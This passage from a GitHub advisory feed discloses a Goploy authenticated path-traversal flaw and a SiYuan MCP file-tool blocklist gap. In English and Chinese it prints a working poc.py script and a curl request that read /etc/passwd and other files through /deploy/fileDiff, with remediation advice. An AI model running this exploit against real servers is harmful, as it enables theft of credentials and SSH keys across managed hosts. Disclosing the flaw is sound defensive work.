+ <img width="1916" height="712" alt="image-4(1)" src="https://github.com/user-attachments/assets/a269b79f-a666-4f3a-95c4-40621e1fbbc2">
+
+</li>
+<li><p><strong>Execute poc.py (See below)</strong></p>
+<ul>
+<li><p><strong>Parameter Explanation:</strong>
+ <code>-u</code> : Target URL
+ <code>-t</code> : Target Cookie/Token to use
+ <code>-f</code> : File to read
+ <code>-s</code> : ID of the managed server to read from</p>
+</li>
+<li><p><strong>Reading from the first managed server (Server ID: 1):</strong></p>
+</li>
+</ul>
+<pre><code class="language-bash">python poc.py -u http://192.168.x.x:8080 -t eyJhbGxxxxxxxxxx... -f /etc/passwd -s 1
+</code></pre>
+ <img width="1173" height="608" alt="image-6(1)" src="https://github.com/user-attachments/assets/e442c247-3ebf-449f-94df-2b2b533b9449">
+
+ <img width="870" height="190" alt="image-5" src="https://github.com/user-attachments/assets/9e53b13a-915c-4f5e-b1bc-f0b3c0b64656">
+
+
+<ul>
+<li><strong>Reading from the second managed server (Server ID: 2):</strong></li>
+</ul>
+<pre><code class="language-bash">python poc.py -u http://192.168.x.x:8080 -t eyJhbGxxxxxxxxxx... -f /etc/passwd -s 2
+</code></pre>
+ <img width="1173" height="231" alt="image-8(1)" src="https://github.com/user-attachments/assets/54e77e8a-259d-4f74-bf31-1a9625bcbe52">
+
+</li>
+<li><p><strong>Reproduction Result</strong>
+The server successfully returns the full contents of the <code>/etc/passwd</code> file from both the Goploy host and the designated remote servers.</p>
+</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<p>Through this vulnerability, an attacker can bypass authorization to read any sensitive files on the host machine as well as all managed target servers. For example:</p>
+<ul>
+<li>Read <code>/etc/passwd</code> or <code>/etc/shadow</code> on the local or remote target servers to obtain host system user information.</li>
+<li>Read users' SSH private keys (e.g., <code>~/.ssh/id_rsa</code>) across different systems, enabling passwordless SSH access to the host or cross-network connections to other servers to steal administrative control, achieving the equivalent of Remote Code Execution (RCE).</li>
+<li>By enumerating the <code>serverID</code>, an attacker can use Goploy as a jump server (bastion host) to conduct large-scale information theft against all bound deployment target systems.</li>
+<li>Obtain various critical configuration files, database credentials, etc., of the affected systems.</li>
+</ul>
+<h2 id="remediation-suggestions">Remediation Suggestions</h2>
+<ol>
+<li><strong>Input Parameter Filtering</strong>: Strictly filter special characters such as <code>../</code>, <code>..\</code>, and <code>%00</code> that can cause directory traversal and truncation when receiving and processing file paths provided by clients.</li>
+<li><strong>Path Whitelist Constraints</strong>: Use built-in functions like <code>filepath.Clean</code> to format the path. Before executing system file read/write operations, strictly verify whether the parsed absolute path prefix is within the legitimate restricted directory scope allowed by the application (such as a preset sandbox directory or project workspace).</li>
+<li><strong>Principle of Least Privilege</strong>: The environment or Docker container running the Goploy service should be executed with low-privileged user identities whenever possible, to mitigate the risk of sensitive system files being read.</li>
+<li><strong>Comprehensive API Audit</strong>: Apart from the APIs mentioned above, there are multiple other APIs that suffer from similar path traversal vulnerabilities. If users obtain the corresponding permissions, it can lead to arbitrary file reads <strong>or even writes</strong>.</li>
+</ol>
+<h2 id="pocpy">poc.py</h2>
+<pre><code class="language-python">#!/usr/bin/env python3
+import requests
+import argparse
+import sys
+import urllib3
+import json
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def banner():
+    print(r"""
+  ____             _               ____       ____ 
+ / ___| ___  _ __ | | ___  _   _  |  _ \ ___ / ___|
+| |  _ / _ \| '_ \| |/ _ \| | | | | |_) / _ \ |    
+| |_| | (_) | |_) | | (_) | |_| | |  __/ (_) | |___ 
+ \____|\___/| .__/|_|\___/ \__, | |_|   \___/ \____|
+            |_|            |___/                    
+
+    Goploy Authenticated Arbitrary File Read PoC
+    """)
+
+def exploit(target_url, token, file_read, args):
+    if not target_url.startswith("http"):
+        target_url = "http://" + target_url
+    
+    target_url = target_url.rstrip('/')
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    }
+    
+    cookies = {
+        "goploy_token": token
+    }
+    
+    print("[*] 正在尝试自动从服务器响应中提取利用所需的所有参数ID...")
+    
+    # 1. 动态获取可用的 Namespace ID
+    namespace_id = 1
+    print(f"[*] 1. 尝试获取可用的 Namespace ID (/namespace/getOption)")
+    try:
+        r_ns = requests.get(f"{target_url}/namespace/getOption", headers=headers, cookies=cookies, verify=False, timeout=10)
+        ns_data = r_ns.json()
+        if ns_data.get("code") == 0 and len(ns_data.get("data", {}).get("list", [])) &gt; 0:
+            namespace_id = ns_data["data"]["list"][0]["namespaceId"]
+            print(f"[+] 成功提取到 Namespace ID: {namespace_id}")
+        else:
+            print(f"[-] 提取 Namespace ID 失败或列表为空，将降级使用默认值 1")
+    except Exception as e:
+        print(f"[-] 提取 Namespace ID 发生异常: {e}")
+
+    # 将获取到的 Namespace ID 放入后续请求的 Header 中
+    headers["G-N-ID"] = str(namespace_id)
+
+    # 2. 动态获取可用的 Server ID
+    server_id = 1
+    if args.server_id is not None:
+        server_id = int(args.server_id)
+        print(f"[*] 2. 用户指定了 Server ID: {server_id} ,跳过自动探测。可用于水平提权目标网络！")
+    else:
+        print(f"[*] 2. 尝试获取可用的 Server ID (/server/getOption)")
+        try:
+            r_srv = requests.get(f"{target_url}/server/getOption", headers=headers, cookies=cookies, verify=False, timeout=10)
+            srv_data = r_srv.json()
+            if srv_data.get("code") == 0 and len(srv_data.get("data", {}).get("list", [])) &gt; 0:
+                server_id = srv_data["data"]["list"][0]["id"]
+                print(f"[+] 成功提取到可用 Server ID: {server_id}")
+            else:
+                print(f"[-] 提取 Server ID 失败或列表为空，将降级尝试猜测值 1")
+        except Exception as e:
+            print(f"[-] 提取 Server ID 发生异常: {e}")
+
+    # 3. 动态获取可用的 Project ID
+    project_id = 1
+    print(f"[*] 3. 尝试获取可用的 Project ID (/deploy/getList)")
+    try:
+        r_proj = requests.get(f"{target_url}/deploy/getList", headers=headers, cookies=cookies, verify=False, timeout=10)
+        proj_data = r_proj.json()
+        if proj_data.get("code") == 0 and len(proj_data.get("data", {}).get("list", [])) &gt; 0:
+            project_id = proj_data["data"]["list"][0]["id"]
+            print(f"[+] 成功提取到 Project ID: {project_id}")
+        else:
+            print(f"[-] 提取 Project ID 失败或列表为空，将降级尝试猜测值 1")
+    except Exception as e:
+        print(f"[-] 提取 Project ID 发生异常: {e}")
+
+    # ==========================
+    # 4. 执行漏洞利用
+    # ==========================
+    headers["Content-Type"] = "application/json"
+    
+    # 构造目录穿越 payload
+    traversal_payload = "../" * 15 + file_read.lstrip('/')
+    
+    data = {
+        "projectId": project_id,
+        "serverId": server_id,
+        "filePath": traversal_payload
+    }
+
+    url_exploit = f"{target_url}/deploy/fileDiff"
+    print(f"\n[*] 目标地址: {url_exploit}")
+    print(f"[*] Payload中包含的系统参数: NamespaceID={namespace_id}, ProjectID={project_id}, ServerID={server_id}")
+    print(f"[*] 尝试读取文件: {file_read}")
+    print(f"[*] 发送最终利用请求中...\n")
+
+    try:
+        response = requests.post(url_exploit, headers=headers, cookies=cookies, json=data, verify=False, timeout=10)
+        
+        if response.status_code == 200:
+            try:
+                # 尝试解析 Goploy 的 JSON 回显格式
+                json_data = response.json()
+                if json_data.get('code') in [0, 1, 2]: # 有时候读取回显为完整的 json 
+                    data_obj = json_data.get('data') if isinstance(json_data.get('data'), dict) else {}
+                    
+                    src_text = data_obj.get('srcText', '')
+                    dist_text = data_obj.get('distText', '')
+                    
+                    if src_text or dist_text:
+                        print("[+] 漏洞利用成功！产生双重文件读取响应：\n")
+                        print("=" * 50)
+                        print(f"【Goploy宿主机 ({url_exploit} 本地) 的文件内容记录在 srcText】:")
+                        print("-" * 50)
+                        print(src_text if src_text else "(空)")
+                        print("=" * 50)
+                        print(f"【被控目标端服务器 (ServerID: {server_id}) 的文件内容记录在 distText】:")
+                        print("-" * 50)
+                        print(dist_text if dist_text else "(空)")
+                        print("=" * 50)
+                    else:
+                        print("[-] 读取操作执行但未返回具体的 srcText 或 distText 数据。正在显示原始 API 返回：")
+                        print(json.dumps(json_data, indent=2))
+                else:
+                    print(f"[-] 服务器返回业务错误 (Code={json_data.get('code')}): {json_data.get('message')}")
+            except ValueError:
+                # 如果不是 JSON 格式，直接输出响应源码
+                print("[+] 收到未知格式响应，以下为原始正文内容：")
+                print(response.text)
+        else:
+            print(f"[-] HTTP 请求失败，HTTP 状态码: {response.status_code}")
+            print(response.text)
+            
+    except requests.exceptions.RequestException as e:
+        print(f"[-] 连接出错: {e}")
+
+if __name__ == "__main__":
+    banner()
+    parser = argparse.ArgumentParser(description="Goploy 任意文件读取概念验证脚本 (PoC)")
+    parser.add_argument("-u", "--url", required=True, help="目标系统基础 URL，例如：http://192.168.240.130")
+    parser.add_argument("-t", "--token", required=True, help="具有低权限成员账户的 goploy_token (Cookie)")
+    parser.add_argument("-f", "--file", default="/etc/passwd", help="想要读取的目标绝对路径文件 (默认: /etc/passwd)")
+    parser.add_argument("-s", "--server_id", default=None, help="强制指定想要读取的远程绑定服务器ServerID(如忽略则尝试自动获取首个)")
+    
+    args = parser.parse_args()
+    
+    exploit(args.url, args.token, args.file, args)
+</code></pre>
+<hr>
+<h1 id="goploy-系统任意文件读取">Goploy 系统任意文件读取</h1>
+<h2 id="漏洞基本信息">漏洞基本信息</h2>
+<ul>
+<li><strong>漏洞名称</strong>：Goploy 系统端点任意文件读取漏洞</li>
+<li><strong>漏洞类型</strong>：路径遍历（Path Traversal, CWE-22） / 任意文件读取</li>
+<li><strong>影响产品</strong>：Goploy</li>
+<li><strong>漏洞危害级别</strong>：高危（CVSS V3 7.7）</li>
+<li><strong>已知影响版本</strong>：&lt;=1.17.5</li>
+</ul>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>Goploy 是一个开源的自动化部署系统。在其后端服务的 <code>/deploy/fileDiff</code>（文件对比）等 API 接口处处理客户端传来的文件路径时，存在严重的路径遍历漏洞。</p>
+<p>该接口的原始逻辑是读取本地项目文件与远程目标服务器文件进行比对。但由于未能充分校验及过滤用户传入的 <code>filePath</code> 参数，也没有对最终的文件绝对路径进行安全约束，将含有 <code>../</code> 的恶意路径直接带入系统中执行。
+这导致了一个<strong>双重任意文件读取</strong>的问题：</p>
+<ol>
+<li>本地宿主机文件读取：<code>os.ReadFile</code> 会被目录穿越 payload 欺骗，读取出 Goploy 宿主机的本地绝对路径任意文件（返回在响应体的 <code>srcText</code> 字段）。</li>
+<li>远程任意受控服务器文件读取：紧接着该 payload 经由 SFTP 协议作用于 <code>serverID</code> 所指向的目标服务器，同样由于受到目录穿越影响，最终读取所配置远程服务器上的任意文件（返回在响应体的 <code>distText</code> 字段）。</li>
+</ol>
+<p><strong>该漏洞利用门槛极低且条件极易满足。</strong> 系统在默认安装时预设了 <code>member</code>（普通成员）角色，且<strong>默认赋予了该角色“文件比对 (FileCompare)”权限</strong>。这意味着系统只要添加了一个普通的低权限使用者，其天然就具备调用目标漏洞端点的基础权限。攻击前提仅仅是系统中配置了至少一个项目和一个服务器。</p>
+<p>攻击者仅需通过抓包指定正确的命名空间 Header（例如 <code>G-N-ID: 1</code>）绕过其简单的限制拦截，且遍历可用的 <code>serverId</code> 参数，即可直接利用该端点成功执行路径遍历，读取 Goploy 本地宿主机以及<strong>各个远端被 Goploy 管理的目标服务器上的任意文件</strong>。</p>
+<h2 id="漏洞复现步骤-proof-of-concept">漏洞复现步骤 (Proof of Concept)</h2>
+<h3 id="理论步骤（具体步骤见下）">理论步骤（具体步骤见下）</h3>
+<ol>
+<li><p><strong>获取普通用户权限</strong>
+使用任意已注册的低权限账户登录系统，获取有效的身份认证凭证（Cookie/Token）。获取其对应有权限的 Namespace ID。</p>
+</li>
+<li><p><strong>构造恶意请求</strong>
+向目标接口 <code>/deploy/fileDiff</code> 发送包含目录穿越字符 <code>../</code> 的 POST 请求，并携带 <code>G-N-ID</code>。</p>
+<p><strong>PoC 示例（读取 <code>/etc/passwd</code>,可以遍历<code>serverId</code>）：</strong></p>
+<pre><code class="language-bash">curl -s -X POST -b "goploy_token=&lt;用户的有效cookie&gt;" \
+     -H "Content-Type: application/json" \
+     -H "G-N-ID: 1" \
+     -d '{"projectId":1,"serverId":1,"filePath":"../../../../../../../../../../etc/passwd"}' \
+     "http://&lt;target-host&gt;/deploy/fileDiff"
+</code></pre>
+</li>
+<li><p><strong>复现结果</strong>
+服务器将返回宿主机和远端服务器 <code>/etc/passwd</code> 文件的完整内容。</p>
+</li>
+</ol>
+<h3 id="具体步骤">具体步骤</h3>
+<ol>
+<li><p><strong>环境</strong>
+ 使用超管账号任意发布了一个项目：</p>
+ <img width="1919" height="428" alt="image" src="https://github.com/user-attachments/assets/8618a038-9088-45b4-804a-5541e243c6a8">
+
+<p> 设置了两个纳管服务器：</p>
+ <img width="1896" height="399" alt="image-1(1)" src="https://github.com/user-attachments/assets/89cfa086-d20b-448e-9cf7-1af5798e3cfe">
+
+<p> 创建了一个普通用户，并赋予menmber角色（文件对比权限）：</p>
+ <img width="1910" height="343" alt="image-2" src="https://github.com/user-attachments/assets/b8dda364-c23d-4496-a555-ff477c511d31">
+
+ <img width="951" height="364" alt="image-3" src="https://github.com/user-attachments/assets/0e20cbed-7341-484c-b0a7-0fcd6ca2fea6">
+</li>
+<li><p><strong>获取普通用户权限</strong>
+ 使用已注册的<code>test</code>账户登录系统，获取有效的身份认证凭证（Cookie/Token）。</p>
+ <img width="1916" height="712" alt="image-4(1)" src="https://github.com/user-attachments/assets/a269b79f-a666-4f3a-95c4-40621e1fbbc2">
+</li>
+<li><p><strong>运行poc.py（见文末）</strong></p>
+<ul>
+<li>参数解释：
+ -u : 目标URL
+ -t : 欲使用的Cookie/Token
+ -f : 欲读取的文件
+ -s : 欲读取的纳管服务器的ID</li>
+<li>读取第一个纳管服务器：</li>
+</ul>
+<pre><code class="language-bash">python poc.py -u http://192.168.x.x:8080 -t eyJhbGxxxxxxxxxx... -f /etc/passwd -s 1
+</code></pre>
+ <img width="1173" height="608" alt="image-6(1)" src="https://github.com/user-attachments/assets/e442c247-3ebf-449f-94df-2b2b533b9449">
+ 
+ <img width="870" height="190" alt="image-5" src="https://github.com/user-attachments/assets/9e53b13a-915c-4f5e-b1bc-f0b3c0b64656">
+
+<ul>
+<li>读取第二个纳管服务器：</li>
+</ul>
+<pre><code class="language-bash">python poc.py -u http://192.168.x.x:8080 -t eyJhbGxxxxxxxxxx... -f /etc/passwd -s 2
+</code></pre>
+ <img width="1173" height="231" alt="image-8(1)" src="https://github.com/user-attachments/assets/54e77e8a-259d-4f74-bf31-1a9625bcbe52">
+</li>
+<li><p><strong>复现结果</strong>
+服务器返回宿主机和任意远端服务器 <code>/etc/passwd</code> 文件的完整内容。</p>
+</li>
+</ol>
+<h2 id="漏洞危害">漏洞危害</h2>
+<p>通过该漏洞，攻击者可越权读取宿主机以及所有纳管服务器目标中的任何敏感文件。例如：</p>
+<ul>
+<li>读取本地或目标远端服务器的 <code>/etc/passwd</code> 或 <code>/etc/shadow</code> 获取主机系统用户信息。</li>
+<li>读取各个系统中用户的 SSH 私钥（如 <code>~/.ssh/id_rsa</code>），从而利用私钥无需密码直接通过 SSH 远程连接宿主机或跨网段连接其他服务器，窃取服务器控制权，达到远程命令执行（RCE）的同等危害。</li>
+<li>结合对 <code>serverID</code> 的枚举，攻击者可以将 Goploy 作为跳板机，针对所有绑定的下发目标系统进行大范围的信息窃取。</li>
+<li>获取系统的各类关键配置文件、数据库凭证等。</li>
+</ul>
+<h2 id="修复建议">修复建议</h2>
+<ol>
+<li><strong>输入参数过滤</strong>：在接收并处理客户端传递的文件路径时，严格过滤 <code>../</code> 、<code>..\\</code> 以及 <code>%00</code> 等可能引起目录跨越与截断的特殊字符。</li>
+<li><strong>路径白名单约束</strong>：利用 <code>filepath.Clean</code> 等内置函数格式化路径，并且在执行系统文件读写操作前，强制校验解析后的绝对路径前缀是否处于应用所允许的合法受限目录范围（如预设的沙盒目录或项目工作区内）内。</li>
+<li><strong>权限最小化</strong>：运行 Goploy 服务的环境或镜像应尽可能以低权限用户身份运行，以此减弱被读取敏感文件的风险。</li>
+<li><strong>检查其他API</strong>：除以上API，还有多处API存在路径遍历漏洞，如果用户获得相应的权限，同样会导致任意文件读<strong>甚至写</strong>。</li>
+</ol>
+<h2 id="pocpy-1">poc.py</h2>
+<pre><code class="language-python">#!/usr/bin/env python3
+import requests
+import argparse
+import sys
+import urllib3
+import json
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def banner():
+    print(r"""
+  ____             _               ____       ____ 
+ / ___| ___  _ __ | | ___  _   _  |  _ \ ___ / ___|
+| |  _ / _ \| '_ \| |/ _ \| | | | | |_) / _ \ |    
+| |_| | (_) | |_) | | (_) | |_| | |  __/ (_) | |___ 
+ \____|\___/| .__/|_|\___/ \__, | |_|   \___/ \____|
+            |_|            |___/                    
+
+    Goploy Authenticated Arbitrary File Read PoC
+    """)
+
+def exploit(target_url, token, file_read, args):
+    if not target_url.startswith("http"):
+        target_url = "http://" + target_url
+    
+    target_url = target_url.rstrip('/')
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    }
+    
+    cookies = {
+        "goploy_token": token
+    }
+    
+    print("[*] 正在尝试自动从服务器响应中提取利用所需的所有参数ID...")
+    
+    # 1. 动态获取可用的 Namespace ID
+    namespace_id = 1
+    print(f"[*] 1. 尝试获取可用的 Namespace ID (/namespace/getOption)")
+    try:
+        r_ns = requests.get(f"{target_url}/namespace/getOption", headers=headers, cookies=cookies, verify=False, timeout=10)
+        ns_data = r_ns.json()
+        if ns_data.get("code") == 0 and len(ns_data.get("data", {}).get("list", [])) &gt; 0:
+            namespace_id = ns_data["data"]["list"][0]["namespaceId"]
+            print(f"[+] 成功提取到 Namespace ID: {namespace_id}")
+        else:
+            print(f"[-] 提取 Namespace ID 失败或列表为空，将降级使用默认值 1")
+    except Exception as e:
+        print(f"[-] 提取 Namespace ID 发生异常: {e}")
+
+    # 将获取到的 Namespace ID 放入后续请求的 Header 中
+    headers["G-N-ID"] = str(namespace_id)
+
+    # 2. 动态获取可用的 Server ID
+    server_id = 1
+    if args.server_id is not None:
+        server_id = int(args.server_id)
+        print(f"[*] 2. 用户指定了 Server ID: {server_id} ,跳过自动探测。可用于水平提权目标网络！")
+    else:
+        print(f"[*] 2. 尝试获取可用的 Server ID (/server/getOption)")
+        try:
+            r_srv = requests.get(f"{target_url}/server/getOption", headers=headers, cookies=cookies, verify=False, timeout=10)
+            srv_data = r_srv.json()
+            if srv_data.get("code") == 0 and len(srv_data.get("data", {}).get("list", [])) &gt; 0:
+                server_id = srv_data["data"]["list"][0]["id"]
+                print(f"[+] 成功提取到可用 Server ID: {server_id}")
+            else:
+                print(f"[-] 提取 Server ID 失败或列表为空，将降级尝试猜测值 1")
+        except Exception as e:
+            print(f"[-] 提取 Server ID 发生异常: {e}")
+
+    # 3. 动态获取可用的 Project ID
+    project_id = 1
+    print(f"[*] 3. 尝试获取可用的 Project ID (/deploy/getList)")
+    try:
+        r_proj = requests.get(f"{target_url}/deploy/getList", headers=headers, cookies=cookies, verify=False, timeout=10)
+        proj_data = r_proj.json()
+        if proj_data.get("code") == 0 and len(proj_data.get("data", {}).get("list", [])) &gt; 0:
+            project_id = proj_data["data"]["list"][0]["id"]
+            print(f"[+] 成功提取到 Project ID: {project_id}")
+        else:
+            print(f"[-] 提取 Project ID 失败或列表为空，将降级尝试猜测值 1")
+    except Exception as e:
+        print(f"[-] 提取 Project ID 发生异常: {e}")
+
+    # ==========================
+    # 4. 执行漏洞利用
+    # ==========================
+    headers["Content-Type"] = "application/json"
+    
+    # 构造目录穿越 payload
+    traversal_payload = "../" * 15 + file_read.lstrip('/')
+    
+    data = {
+        "projectId": project_id,
+        "serverId": server_id,
+        "filePath": traversal_payload
+    }
+
+    url_exploit = f"{target_url}/deploy/fileDiff"
+    print(f"\n[*] 目标地址: {url_exploit}")
+    print(f"[*] Payload中包含的系统参数: NamespaceID={namespace_id}, ProjectID={project_id}, ServerID={server_id}")
+    print(f"[*] 尝试读取文件: {file_read}")
+    print(f"[*] 发送最终利用请求中...\n")
+
+    try:
+        response = requests.post(url_exploit, headers=headers, cookies=cookies, json=data, verify=False, timeout=10)
+        
+        if response.status_code == 200:
+            try:
+                # 尝试解析 Goploy 的 JSON 回显格式
+                json_data = response.json()
+                if json_data.get('code') in [0, 1, 2]: # 有时候读取回显为完整的 json 
+                    data_obj = json_data.get('data') if isinstance(json_data.get('data'), dict) else {}
+                    
+                    src_text = data_obj.get('srcText', '')
+                    dist_text = data_obj.get('distText', '')
+                    
+                    if src_text or dist_text:
+                        print("[+] 漏洞利用成功！产生双重文件读取响应：\n")
+                        print("=" * 50)
+                        print(f"【Goploy宿主机 ({url_exploit} 本地) 的文件内容记录在 srcText】:")
+                        print("-" * 50)
+                        print(src_text if src_text else "(空)")
+                        print("=" * 50)
+                        print(f"【被控目标端服务器 (ServerID: {server_id}) 的文件内容记录在 distText】:")
+                        print("-" * 50)
+                        print(dist_text if dist_text else "(空)")
+                        print("=" * 50)
+                    else:
+                        print("[-] 读取操作执行但未返回具体的 srcText 或 distText 数据。正在显示原始 API 返回：")
+                        print(json.dumps(json_data, indent=2))
+                else:
+                    print(f"[-] 服务器返回业务错误 (Code={json_data.get('code')}): {json_data.get('message')}")
+            except ValueError:
+                # 如果不是 JSON 格式，直接输出响应源码
+                print("[+] 收到未知格式响应，以下为原始正文内容：")
+                print(response.text)
+        else:
+            print(f"[-] HTTP 请求失败，HTTP 状态码: {response.status_code}")
+            print(response.text)
+            
+    except requests.exceptions.RequestException as e:
+        print(f"[-] 连接出错: {e}")
+
+if __name__ == "__main__":
+    banner()
+    parser = argparse.ArgumentParser(description="Goploy 任意文件读取概念验证脚本 (PoC)")
+    parser.add_argument("-u", "--url", required=True, help="目标系统基础 URL，例如：http://192.168.240.130")
+    parser.add_argument("-t", "--token", required=True, help="具有低权限成员账户的 goploy_token (Cookie)")
+    parser.add_argument("-f", "--file", default="/etc/passwd", help="想要读取的目标绝对路径文件 (默认: /etc/passwd)")
+    parser.add_argument("-s", "--server_id", default=None, help="强制指定想要读取的远程绑定服务器ServerID(如忽略则尝试自动获取首个)")
+    
+    args = parser.parse_args()
+    
+    exploit(args.url, args.token, args.file, args)
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/zhenorzz/goploy/security/advisories/GHSA-4g5x-hcwm-82jw">https://github.com/zhenorzz/goploy/security/advisories/GHSA-4g5x-hcwm-82jw</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53553">https://nvd.nist.gov/vuln/detail/CVE-2026-53553</a></li>
+<li><a href="https://github.com/zhenorzz/goploy/commit/d51aa15ebc0a474d9d71d6c453a0fe798dd5e007">https://github.com/zhenorzz/goploy/commit/d51aa15ebc0a474d9d71d6c453a0fe798dd5e007</a></li>
+<li><a href="http://github.com/zhenorzz/goploy/releases/tag/v1.18.0">http://github.com/zhenorzz/goploy/releases/tag/v1.18.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-4g5x-hcwm-82jw">https://github.com/advisories/GHSA-4g5x-hcwm-82jw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4g5x-hcwm-82jw</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-07T23:42:24.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan: MCP file tool's blocklist is incomplete relative to the HTTP file API it claims to align with, exposing publish-mode passwords and other sensitive workspace files]]></title>
+        <id>https://github.com/advisories/GHSA-c8r8-95hg-mp34</id>
+        <link href="https://github.com/advisories/GHSA-c8r8-95hg-mp34"/>
+        <updated>2026-10-27T14:43:58.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>kernel/mcp/tools/file.go</code>'s <code>resolvePath()</code> includes an explicit comment stating its
+sensitive-path blocklist is meant to align with the HTTP file API's established blacklist
+(<code>refuseToAccess()</code> in <code>kernel/api/file.go</code>), following the remediation for GHSA-cvhv-7xhj-xjp8
+("Unauthenticated Administrator takeover exfiltrated via the MCP"), which specifically
+recommended restricting this tool's scope. In practice, the MCP tool implements only 1 of the
+4 static blocklist entries the HTTP API enforces.</p>
+<h2 id="comparison">Comparison</h2>
+<p><code>kernel/api/file.go</code> <code>refuseToAccess()</code> blocks:</p>
+<ol>
+<li><code>conf/conf.json</code> (API token, cookie signing key, accessAuthCode)</li>
+<li><code>data/snippets/conf.json</code></li>
+<li>the entire <code>data/templates</code> directory</li>
+<li><code>data/.siyuan/publishAccess.json</code></li>
+<li>(dynamic, per-request) any path the current publish-mode session isn't authorized for</li>
+</ol>
+<p><code>kernel/mcp/tools/file.go</code> <code>resolvePath()</code> blocks only:</p>
+<pre><code class="language-go">confPath := filepath.Join(util.ConfDir, "conf.json")
+if abs == confPath {
+    return "", fmt.Errorf("access to conf.json is forbidden")
+}
+</code></pre>
+<p>Items 2, 3, and 4 are absent. The tool's own <code>list</code>/<code>read</code>/<code>grep</code>/<code>find</code> actions remain fully
+functional against them.</p>
+<h2 id="impact">Impact</h2>
+<p>An MCP client with access to the <code>file</code> tool (post-fix for GHSA-cvhv-7xhj-xjp8, i.e. a properly
+authenticated Administrator-level caller) can read <code>data/.siyuan/publishAccess.json</code> directly:</p>
+<pre><code class="language-go">type PublishAccessItem struct {
+    ID       string `json:"id"`
+    Visible  bool   `json:"visible"`
+    Password string `json:"password"` // plaintext; empty string = no password
+    Disable  bool   `json:"disable"`
+}
+</code></pre>
+<p>This exposes the plaintext access password for every publish-mode-shared notebook/document,
+letting the reader bypass password protection on any publish-mode share. This is a serious
+sibling issue given the volume of publish-mode access-control bugs already reported against this
+codebase — the passwords protecting exactly that feature are directly readable through a tool
+whose own description says "never use for workspace data."</p>
+<p><code>data/templates</code> and <code>data/snippets/conf.json</code> are lower-severity but still inconsistent with
+the HTTP API's own precedent for what counts as sensitive.</p>
+<h2 id="why-this-is-a-distinct-finding-not-a-duplicate">Why this is a distinct finding, not a duplicate</h2>
+<p>GHSA-cvhv-7xhj-xjp8 was about <em>reachability</em> an unauthenticated Reader-tier JWT being forwarded
+to admin-scoped paths including <code>/mcp</code>. That has been fixed. This report is about the <em>tool's own
+scope</em> once reached by a legitimate, properly-authenticated caller, the remediation notes for
+that same advisory explicitly called for restricting <code>resolvePath</code> to
+<code>WorkspaceDir/temp/siyuan/*.log</code>, which was not implemented; instead the tool retains
+workspace-wide scope with only a single-file blocklist addition.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Either replicate the full <code>refuseToAccess()</code> blocklist in <code>resolvePath()</code> (minimum fix, keeps
+parity with the HTTP API going forward by extracting <code>refuseToAccess</code>'s path list into a shared
+helper both call), or implement the originally-recommended allowlist restricting the tool to
+<code>WorkspaceDir/temp/siyuan/*.log</code> for read and disabling write/delete/rename/copy entirely unless
+the caller is Administrator, matching the tool's own advertised "debugging/log reading only"
+scope.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-c8r8-95hg-mp34">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-c8r8-95hg-mp34</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-60083">https://nvd.nist.gov/vuln/detail/CVE-2026-60083</a></li>
+<li><a href="https://github.com/siyuan-note/siyuan/commit/3542530c505f13aa3fbd0343627409ca6c000dd2">https://github.com/siyuan-note/siyuan/commit/3542530c505f13aa3fbd0343627409ca6c000dd2</a></li>
+<li><a href="https://github.com/siyuan-note/siyuan/releases/tag/v3.8.0">https://github.com/siyuan-note/siyuan/releases/tag/v3.8.0</a></li>
+<li><a href="https://www.vulncheck.com/advisories/siyuan-before-incomplete-path-blocklist-via-mcp-file-tool">https://www.vulncheck.com/advisories/siyuan-before-incomplete-path-blocklist-via-mcp-file-tool</a></li>
+<li><a href="https://github.com/advisories/GHSA-c8r8-95hg-mp34">https://github.com/advisories/GHSA-c8r8-95hg-mp34</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c8r8-95hg-mp34</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-10-27T14:43:57.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan] Duplicate Advisory: SiYuan: MCP file tool's blocklist is incomplete relative to the HTTP file API it claims to align with, exposing publish-mode passwords and other sensitive workspace filesDuplicate Advisory: ]]></title>
+        <id>https://github.com/advisories/GHSA-rp7c-4prv-9rrg</id>
+        <link href="https://github.com/advisories/GHSA-rp7c-4prv-9rrg"/>
+        <updated>2026-10-27T14:43:49.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-c8r8-95hg-mp34. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>SiYuan versions before v3.8.0 contain an incomplete path blocklist in the MCP file tool that fails to restrict access to sensitive workspace files protected by the HTTP API. Authenticated administrators can read plaintext publish-mode passwords from data/.siyuan/publishAccess.json and access other sensitive files like data/templates and data/snippets/conf.json.</p>
+<h3 id="references">References</h3>
+<ul>
